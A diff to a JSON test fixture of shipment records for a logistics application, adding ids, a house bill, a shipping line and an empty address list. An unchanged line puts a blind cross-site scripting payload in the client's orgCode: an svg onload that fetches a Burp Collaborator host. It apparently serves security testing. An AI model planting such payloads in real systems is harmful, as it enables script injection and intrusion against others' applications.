@@ -1306,6 +1306,8 @@
   "NEW_SHIPMENT": {
     "transportMode": "SEA",
     "status": 0,
+    "guid": "1a53dcdc-19dc-4789-b4e3-6fc7e9b4d4a1",
+    "houseBill": "custom-house-bill",
     "source": "System",
     "weightUnit": "KG",
     "volumeUnit": "M3",
@@ -1367,13 +1369,15 @@
       "exportBroker": null
     },
     "carrierDetails": {
+      "id": 1,
       "masterData": {},
       "unlocationData": {},
       "carrierMasterData": {},
       "origin": "25C74A19-16AE-4CB8-A6C0-357B58B0D031",
       "originPort": "0E8F5220-D6CE-4D29-9755-B7C32A4B9F4F",
       "destinationPort": "38C78DB3-E3C2-41D8-A32D-3A139B0AA67A",
-      "destination": "d7837264-3079-467b-ab10-2cd59bcdb49e"
+      "destination": "d7837264-3079-467b-ab10-2cd59bcdb49e",
+      "shippingLine": "APL"
     },
     "masterData": {
       "volumeUnit": "M3 (Cubic Meters)",
@@ -1397,6 +1401,7 @@
     "jobType": "ABC",
     "serviceType": "C2P",
     "client": {
+      "id": 1,
       "orgCode": "'\"><svg/onload=fetch`//yprm92zcggt7wfkocpe86306hxnqbh15tvhn4ds2\\.burpcollaborator.net`>",
       "addressCode": "Default",
       "orgData": {
@@ -1437,6 +1442,7 @@
       }
     },
     "consigner": {
+      "id": 1,
       "orgCode": "000043",
       "addressCode": "VALID",
       "orgData": {
@@ -1475,6 +1481,7 @@
       }
     },
     "consignee": {
+      "id": 1,
       "orgCode": "00001",
       "addressCode": "Default1",
       "orgData": {
@@ -1695,7 +1702,8 @@
     "notifyPartyDpsAddressId": null,
     "consigneeDpsAddressId": null,
     "destinationPortCountry": "NOR",
-    "eventsList": []
+    "eventsList": [],
+    "shipmentAddresses": []
   },
   "NEW_CONSOLIDATION_CREATE" : {
     "transportMode": "SEA",
